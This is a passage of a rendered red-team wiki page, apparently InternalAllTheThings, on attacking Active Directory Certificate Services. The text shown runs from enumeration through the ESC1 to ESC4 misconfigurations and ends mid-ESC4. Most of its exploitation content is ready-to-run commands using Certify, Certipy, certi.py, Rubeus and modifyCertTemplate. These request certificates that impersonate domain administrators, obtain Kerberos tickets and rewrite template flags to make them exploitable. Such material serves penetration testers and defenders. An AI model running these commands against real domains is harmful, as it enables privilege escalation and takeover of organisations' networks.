          <label class="md-nav__link" for="__nav_11_2" id="__nav_11_2_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Escalation
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_11_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_11_2">
            <span class="md-nav__icon md-icon"></span>
            Escalation
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../redteam/escalation/linux-privilege-escalation/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Linux - Privilege Escalation
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../redteam/escalation/windows-privilege-escalation/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Windows - Privilege Escalation
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_11_3" >
        
          
          <label class="md-nav__link" for="__nav_11_3" id="__nav_11_3_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Evasion
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_11_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_11_3">
            <span class="md-nav__icon md-icon"></span>
            Evasion
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../redteam/evasion/edr-bypass/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Endpoint Detection and Response
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../redteam/evasion/elastic-edr/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Elastic EDR
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../redteam/evasion/linux-evasion/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Linux - Evasion
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../redteam/evasion/proxy-bypass/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Proxy Bypass
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../redteam/evasion/windows-amsi-bypass/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Windows - AMSI Bypass
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../redteam/evasion/windows-defenses/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Windows - Defenses
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../redteam/evasion/windows-dpapi/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Windows - DPAPI
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_11_4" >
        
          
          <label class="md-nav__link" for="__nav_11_4" id="__nav_11_4_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Persistence
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_11_4_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_11_4">
            <span class="md-nav__icon md-icon"></span>
            Persistence
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../redteam/persistence/linux-persistence/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Linux - Persistence
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../redteam/persistence/rdp-persistence/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    RDP - Persistence
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../redteam/persistence/windows-persistence/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Windows - Persistence
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_11_5" >
        
          
          <label class="md-nav__link" for="__nav_11_5" id="__nav_11_5_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Pivoting
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_11_5_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_11_5">
            <span class="md-nav__icon md-icon"></span>
            Pivoting
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../redteam/pivoting/network-pivoting-techniques/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Network Pivoting Techniques
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#adcs-enumeration" class="md-nav__link">
    <span class="md-ellipsis">
      ADCS Enumeration
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#certificate-enrollment" class="md-nav__link">
    <span class="md-ellipsis">
      Certificate Enrollment
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#esc1-misconfigured-certificate-templates" class="md-nav__link">
    <span class="md-ellipsis">
      ESC1 - Misconfigured Certificate Templates
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#esc2-misconfigured-certificate-templates" class="md-nav__link">
    <span class="md-ellipsis">
      ESC2 - Misconfigured Certificate Templates
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#esc3-misconfigured-enrollment-agent-templates" class="md-nav__link">
    <span class="md-ellipsis">
      ESC3 - Misconfigured Enrollment Agent Templates
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#esc4-access-control-vulnerabilities" class="md-nav__link">
    <span class="md-ellipsis">
      ESC4 - Access Control Vulnerabilities
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#esc5-vulnerable-pki-object-access-control" class="md-nav__link">
    <span class="md-ellipsis">
      ESC5 - Vulnerable PKI Object Access Control
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#esc6-editf_attributesubjectaltname2" class="md-nav__link">
    <span class="md-ellipsis">
      ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#esc7-vulnerable-certificate-authority-access-control" class="md-nav__link">
    <span class="md-ellipsis">
      ESC7 - Vulnerable Certificate Authority Access Control
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#esc8-web-enrollment-relay" class="md-nav__link">
    <span class="md-ellipsis">
      ESC8 - Web Enrollment Relay
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#esc9-no-security-extension" class="md-nav__link">
    <span class="md-ellipsis">
      ESC9 - No Security Extension
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#esc11-relaying-ntlm-to-icpr" class="md-nav__link">
    <span class="md-ellipsis">
      ESC11 - Relaying NTLM to ICPR
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#esc12-adcs-ca-on-yubihsm" class="md-nav__link">
    <span class="md-ellipsis">
      ESC12 - ADCS CA on YubiHSM
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#esc13-issuance-policy" class="md-nav__link">
    <span class="md-ellipsis">
      ESC13 - Issuance Policy
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#esc14-altsecurityidentities" class="md-nav__link">
    <span class="md-ellipsis">
      ESC14 - altSecurityIdentities
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#esc15-ekuwu-application-policies-cve-2024-49019" class="md-nav__link">
    <span class="md-ellipsis">
      ESC15 - EKUwu Application Policies - CVE-2024-49019
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#certifried-cve-2022-26923" class="md-nav__link">
    <span class="md-ellipsis">
      Certifried CVE-2022-26923
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#pass-the-certificate" class="md-nav__link">
    <span class="md-ellipsis">
      Pass-The-Certificate
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Pass-The-Certificate">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#pkinit-error" class="md-nav__link">
    <span class="md-ellipsis">
      PKINIT ERROR
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#unpac-the-hash" class="md-nav__link">
    <span class="md-ellipsis">
      UnPAC The Hash
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#references" class="md-nav__link">
    <span class="md-ellipsis">
      References
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          
            <div class="md-content" data-md-component="content">
              <article class="md-content__inner md-typeset">
                
	
                  


  
    <a href="https://github.com/swisskyrepo/InternalAllTheThings/blob/main/docs/active-directory/ad-adcs-certificate-services.md" title="Edit this page" class="md-content__button md-icon">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M10 20H6V4h7v5h5v3.1l2-2V8l-6-6H6c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h4zm10.2-7c.1 0 .3.1.4.2l1.3 1.3c.2.2.2.6 0 .8l-1 1-2.1-2.1 1-1c.1-.1.2-.2.4-.2m0 3.9L14.1 23H12v-2.1l6.1-6.1z"/></svg>
    </a>
  
  
    
      
    
    <a href="https://github.com/swisskyrepo/InternalAllTheThings/raw/main/docs/active-directory/ad-adcs-certificate-services.md" title="View source of this page" class="md-content__button md-icon">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 18c.56 0 1 .44 1 1s-.44 1-1 1-1-.44-1-1 .44-1 1-1m0-3c-2.73 0-5.06 1.66-6 4 .94 2.34 3.27 4 6 4s5.06-1.66 6-4c-.94-2.34-3.27-4-6-4m0 6.5a2.5 2.5 0 0 1-2.5-2.5 2.5 2.5 0 0 1 2.5-2.5 2.5 2.5 0 0 1 2.5 2.5 2.5 2.5 0 0 1-2.5 2.5M9.27 20H6V4h7v5h5v4.07c.7.08 1.36.25 2 .49V8l-6-6H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h4.5a8.2 8.2 0 0 1-1.23-2"/></svg>
    </a>
  


<h1 id="active-directory-certificate-services">Active Directory - Certificate Services</h1>
<p>Active Directory Certificate Services (AD CS) is a Microsoft Windows server role that provides a public key infrastructure (PKI). It allows you to create, manage, and distribute digital certificates, which are used to secure communication and transactions across a network.</p>
<h2 id="adcs-enumeration">ADCS Enumeration</h2>
<ul>
<li>
<p>NetExec:</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="n">netexec</span> <span class="n">ldap</span> <span class="n">domain</span><span class="p">.</span><span class="n">lab</span> <span class="n">-u</span> <span class="n">username</span> <span class="n">-p</span> <span class="n">password</span> <span class="n">-M</span> <span class="n">adcs</span>
</code></pre></div>
</li>
<li>
<p>ldapsearch:</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="n">ldapsearch</span> <span class="n">-H</span> <span class="n">ldap</span><span class="p">://</span><span class="n">dc_IP</span> <span class="n">-x</span> <span class="n">-LLL</span> <span class="n">-D</span> <span class="s1">&#39;CN=&lt;user&gt;,OU=Users,DC=domain,DC=local&#39;</span> <span class="n">-w</span> <span class="s1">&#39;&lt;password&gt;&#39;</span> <span class="n">-b</span> <span class="s2">&quot;CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=CONFIGURATION,DC=domain,DC=local&quot;</span> <span class="n">dNSHostName</span>
</code></pre></div>
</li>
<li>
<p>certutil:</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="n">certutil</span><span class="p">.</span><span class="n">exe</span> <span class="n">-config</span> <span class="p">-</span> <span class="n">-ping</span>
<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="n">certutil</span> <span class="n">-dump</span>
</code></pre></div>
</li>
</ul>
<h2 id="certificate-enrollment">Certificate Enrollment</h2>
<ul>
<li>
<p>DNS required (<code>CT_FLAG_SUBJECT_ALT_REQUIRE_DNS</code> or <code>CT_FLAG_SUBJECT_ALT_REQUIRE_DOMAIN_DNS</code>): only principals with their <code>dNSHostName</code> attribute set can enroll.</p>
<ul>
<li>Active Directory Users cannot enroll in certificate templates requiring <code>dNSHostName</code>.</li>
<li>Computers will get their <code>dNSHostName</code> attribute set when you <strong>domain-join</strong> a computer, but the attribute is null if you simply create a computer object in AD.</li>
<li>Computers have validated write to their <code>dNSHostName</code> attribute meaning they can add a DNS name matching their computer name.</li>
</ul>
</li>
<li>
<p>Email required (<code>CT_FLAG_SUBJECT_ALT_REQUIRE_EMAIL</code> or <code>CT_FLAG_SUBJECT_REQUIRE_EMAIL</code>): only principals with their <code>mail</code> attribute set can enroll unless the template is of schema version 1.</p>
<ul>
<li>By default, users and computers do not have their <code>mail</code> attribute set, and they cannot modify this attribute themselves.</li>
<li>Users might have the <code>mail</code> attribute set, but it is rare for computers.</li>
</ul>
</li>
</ul>
<h2 id="esc1-misconfigured-certificate-templates">ESC1 - Misconfigured Certificate Templates</h2>
<blockquote>
<p>Domain Users can enroll in the <strong>VulnTemplate</strong> template, which can be used for client authentication and has <strong>ENROLLEE_SUPPLIES_SUBJECT</strong> set. This allows anyone to enroll in this template and specify an arbitrary Subject Alternative Name (i.e. as a DA). Allows additional identities to be bound to a certificate beyond the Subject.</p>
</blockquote>
<p><strong>Requirements</strong></p>
<ul>
<li>Template that allows for AD authentication</li>
<li><strong>ENROLLEE_SUPPLIES_SUBJECT</strong> flag</li>
<li>[PKINIT] Client Authentication, Smart Card Logon, Any Purpose, or No EKU (Extended/Enhanced Key Usage)</li>
</ul>
<p><strong>Exploitation</strong></p>
<ul>
<li>
<p>Use <a href="https://github.com/GhostPack/Certify">Certify.exe</a> to see if there are any vulnerable templates</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="n">Certify</span><span class="p">.</span><span class="n">exe</span> <span class="n">find</span> <span class="p">/</span><span class="n">vulnerable</span>
<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="n">Certify</span><span class="p">.</span><span class="n">exe</span> <span class="n">find</span> <span class="p">/</span><span class="n">vulnerable</span> <span class="p">/</span><span class="n">currentuser</span>
<a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="c"># or</span>
<a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a><span class="n">PS</span><span class="p">&gt;</span> <span class="nb">Get-ADObject</span> <span class="n">-LDAPFilter</span> <span class="s1">&#39;(&amp;(objectclass=pkicertificatetemplate)(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2) (pkiextendedkeyusage=1.3.6.1.5.2.3.4))(mspki-certificate-name-flag:1.2.840.113556.1.4.804:=1))&#39;</span> <span class="n">-SearchBase</span> <span class="s1">&#39;CN=Configuration,DC=lab,DC=local&#39;</span>
<a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a><span class="c"># or</span>
<a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a><span class="n">certipy</span> <span class="s1">&#39;domain.local&#39;</span><span class="p">/</span><span class="s1">&#39;user&#39;</span><span class="p">:</span><span class="s1">&#39;password&#39;</span><span class="p">@</span><span class="s1">&#39;domaincontroller&#39;</span> <span class="n">find</span> <span class="n">-bloodhound</span>
<a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a><span class="c"># or</span>
<a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a><span class="n">python</span> <span class="n">bloodyAD</span><span class="p">.</span><span class="n">py</span> <span class="n">-u</span> <span class="n">john</span><span class="p">.</span><span class="n">doe</span> <span class="n">-p</span> <span class="s1">&#39;Password123!&#39;</span> <span class="p">-</span><span class="n">-host</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">100</span><span class="p">.</span><span class="n">1</span> <span class="n">-d</span> <span class="n">bloody</span><span class="p">.</span><span class="n">lab</span> <span class="n">get</span> <span class="n">search</span> <span class="p">-</span><span class="n">-base</span> <span class="s1">&#39;CN=Configuration,DC=lab,DC=local&#39;</span> <span class="p">-</span><span class="n">-filter</span> <span class="s1">&#39;(&amp;(objectclass=pkicertificatetemplate)(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2) (pkiextendedkeyusage=1.3.6.1.5.2.3.4))(mspki-certificate-name-flag:1.2.840.113556.1.4.804:=1))&#39;</span>
</code></pre></div>
</li>
<li>
<p>Use Certify, <a href="https://github.com/eloypgz/certi">Certi</a> or <a href="https://github.com/ly4k/Certipy">Certipy</a> to request a Certificate and add an alternative name (user to impersonate)</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="c"># request certificates for the machine account by executing Certify with the &quot;/machine&quot; argument from an elevated command prompt.</span>
<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="n">Certify</span><span class="p">.</span><span class="n">exe</span> <span class="n">request</span> <span class="p">/</span><span class="n">ca</span><span class="p">:</span><span class="n">dc</span><span class="p">.</span><span class="n">domain</span><span class="p">.</span><span class="n">local</span><span class="p">\</span><span class="n">domain-DC-CA</span> <span class="p">/</span><span class="n">template</span><span class="p">:</span><span class="n">VulnTemplate</span> <span class="p">/</span><span class="n">altname</span><span class="p">:</span><span class="n">domadmin</span>
<a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="n">certi</span><span class="p">.</span><span class="n">py</span> <span class="n">req</span> <span class="s1">&#39;contoso.local/Anakin@dc01.contoso.local&#39;</span> <span class="n">contoso-DC01-CA</span> <span class="n">-k</span> <span class="n">-n</span> <span class="p">-</span><span class="n">-alt-name</span> <span class="n">han</span> <span class="p">-</span><span class="n">-template</span> <span class="n">UserSAN</span>
<a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a><span class="n">certipy</span> <span class="n">req</span> <span class="s1">&#39;corp.local/john:Passw0rd!@ca.corp.local&#39;</span> <span class="n">-ca</span> <span class="s1">&#39;corp-CA&#39;</span> <span class="n">-template</span> <span class="s1">&#39;ESC1&#39;</span> <span class="n">-alt</span> <span class="s1">&#39;administrator@corp.local&#39;</span>
</code></pre></div>
</li>
<li>
<p>Use OpenSSL and convert the certificate, do not enter a password</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="n">openssl</span> <span class="n">pkcs12</span> <span class="n">-in</span> <span class="n">cert</span><span class="p">.</span><span class="n">pem</span> <span class="n">-keyex</span> <span class="n">-CSP</span> <span class="s2">&quot;Microsoft Enhanced Cryptographic Provider v1.0&quot;</span> <span class="n">-export</span> <span class="n">-out</span> <span class="n">cert</span><span class="p">.</span><span class="n">pfx</span>
</code></pre></div>
</li>
<li>
<p>Move the cert.pfx to the target machine filesystem and request a TGT for the altname user using Rubeus</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">asktgt</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="n">domadmin</span> <span class="p">/</span><span class="n">certificate</span><span class="p">:</span><span class="n">C</span><span class="p">:\</span><span class="n">Temp</span><span class="p">\</span><span class="n">cert</span><span class="p">.</span><span class="n">pfx</span>
</code></pre></div>
</li>
</ul>
<p><strong>WARNING</strong>: These certificates will still be usable even if the user or computer resets their password!</p>
<p><strong>NOTE</strong>: Look for <strong>EDITF_ATTRIBUTESUBJECTALTNAME2</strong>, <strong>CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT</strong>, <strong>ManageCA</strong> flags, and NTLM Relay to AD CS HTTP Endpoints.</p>
<h2 id="esc2-misconfigured-certificate-templates">ESC2 - Misconfigured Certificate Templates</h2>
<p><strong>Requirements</strong></p>
<ul>
<li>Allows requesters to specify a Subject Alternative Name (SAN) in the CSR as well as allows Any Purpose EKU (2.5.29.37.0)</li>
</ul>
<p><strong>Exploitation</strong></p>
<ul>
<li>Find template</li>
</ul>
<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="nb">PS </span><span class="p">&gt;</span> <span class="nb">Get-ADObject</span> <span class="n">-LDAPFilter</span> <span class="s1">&#39;(&amp;(objectclass=pkicertificatetemplate)(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))&#39;</span> <span class="n">-SearchBase</span> <span class="s1">&#39;CN=Configuration,DC=megacorp,DC=local&#39;</span>
<a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a><span class="c"># or</span>
<a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a><span class="n">python</span> <span class="n">bloodyAD</span><span class="p">.</span><span class="n">py</span> <span class="n">-u</span> <span class="n">john</span><span class="p">.</span><span class="n">doe</span> <span class="n">-p</span> <span class="s1">&#39;Password123!&#39;</span> <span class="p">-</span><span class="n">-host</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">100</span><span class="p">.</span><span class="n">1</span> <span class="n">-d</span> <span class="n">bloody</span><span class="p">.</span><span class="n">lab</span> <span class="n">get</span> <span class="n">search</span> <span class="p">-</span><span class="n">-base</span> <span class="s1">&#39;CN=Configuration,DC=megacorp,DC=local&#39;</span> <span class="p">-</span><span class="n">-filter</span> <span class="s1">&#39;(&amp;(objectclass=pkicertificatetemplate)(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))&#39;</span>
</code></pre></div>
<ul>
<li>Request a certificate specifying the <code>/altname</code> as a domain admin like in <a href="#esc1---misconfigured-certificate-templates">ESC1</a>.</li>
</ul>
<h2 id="esc3-misconfigured-enrollment-agent-templates">ESC3 - Misconfigured Enrollment Agent Templates</h2>
<blockquote>
<p>ESC3 is when a certificate template specifies the Certificate Request Agent EKU (Enrollment Agent). This EKU can be used to request certificates on behalf of other users</p>
</blockquote>
<ul>
<li>Request a certificate based on the vulnerable certificate template ESC3.</li>
</ul>
<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="p">$</span> <span class="n">certipy</span> <span class="n">req</span> <span class="s1">&#39;corp.local/john:Passw0rd!@ca.corp.local&#39;</span> <span class="n">-ca</span> <span class="s1">&#39;corp-CA&#39;</span> <span class="n">-template</span> <span class="s1">&#39;ESC3&#39;</span>
<a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a><span class="p">[*]</span> <span class="n">Saved</span> <span class="n">certificate</span> <span class="n">and</span> <span class="n">private</span> <span class="n">key</span> <span class="n">to</span> <span class="s1">&#39;john.pfx&#39;</span>
</code></pre></div>
<ul>
<li>Use the Certificate Request Agent certificate (-pfx) to request a certificate on behalf of other another user</li>
</ul>
<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="n">certipy</span> <span class="n">req</span> <span class="s1">&#39;corp.local/john:Passw0rd!@ca.corp.local&#39;</span> <span class="n">-ca</span> <span class="s1">&#39;corp-CA&#39;</span> <span class="n">-template</span> <span class="s1">&#39;User&#39;</span> <span class="n">-on-behalf-of</span> <span class="s1">&#39;corp\administrator&#39;</span> <span class="n">-pfx</span> <span class="s1">&#39;john.pfx&#39;</span>
</code></pre></div>
<h2 id="esc4-access-control-vulnerabilities">ESC4 - Access Control Vulnerabilities</h2>
<blockquote>
<p>Enabling the <code>mspki-certificate-name-flag</code> flag for a template that allows for domain authentication, allow attackers to "push a misconfiguration to a template leading to ESC1 vulnerability</p>
</blockquote>
<ul>
<li>Search for <code>WriteProperty</code> with value <code>00000000-0000-0000-0000-000000000000</code> using <a href="https://github.com/fortalice/modifyCertTemplate">modifyCertTemplate</a></li>
</ul>
<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="n">python3</span> <span class="n">modifyCertTemplate</span><span class="p">.</span><span class="n">py</span> <span class="n">domain</span><span class="p">.</span><span class="n">local</span><span class="p">/</span><span class="n">user</span> <span class="n">-k</span> <span class="n">-no-pass</span> <span class="n">-template</span> <span class="n">user</span> <span class="n">-dc-ip</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span> <span class="n">-get-acl</span>
</code></pre></div>
<ul>
<li>Add the <code>ENROLLEE_SUPPLIES_SUBJECT</code> (ESS) flag to perform ESC1</li>
</ul>
<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="n">python3</span> <span class="n">modifyCertTemplate</span><span class="p">.</span><span class="n">py</span> <span class="n">domain</span><span class="p">.</span><span class="n">local</span><span class="p">/</span><span class="n">user</span> <span class="n">-k</span> <span class="n">-no-pass</span> <span class="n">-template</span> <span class="n">user</span> <span class="n">-dc-ip</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span> <span class="n">-add</span> <span class="n">enrollee_supplies_subject</span> <span class="n">-property</span> <span class="n">mspki-Certificate-Name-Flag</span>
<a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>
<a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a><span class="c"># Add/remove ENROLLEE_SUPPLIES_SUBJECT flag from the WebServer template. </span>
<a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a><span class="n">C</span><span class="p">:\&gt;</span><span class="n">StandIn</span><span class="p">.</span><span class="n">exe</span> <span class="p">-</span><span class="n">-adcs</span> <span class="p">-</span><span class="n">-filter</span> <span class="n">WebServer</span> <span class="p">-</span><span class="n">-ess</span> <span class="p">-</span><span class="n">-add</span>
</code></pre></div>
<ul>
<li>Perform ESC1 and then restore the value</li>
</ul>
<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="n">python3</span> <span class="n">modifyCertTemplate</span><span class="p">.</span><span class="n">py</span> <span class="n">domain</span><span class="p">.</span><span class="n">local</span><span class="p">/</span><span class="n">user</span> <span class="n">-k</span> <span class="n">-no-pass</span> <span class="n">-template</span> <span class="n">user</span> <span class="n">-dc-ip</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span> <span class="n">-value</span> <span class="n">0</span> <span class="n">-property</span> <span class="n">mspki-Certificate-Name-Flag</span>
</code></pre></div>
<p>Using Certipy</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="c"># overwrite the configuration to make it vulnerable to ESC1</span>
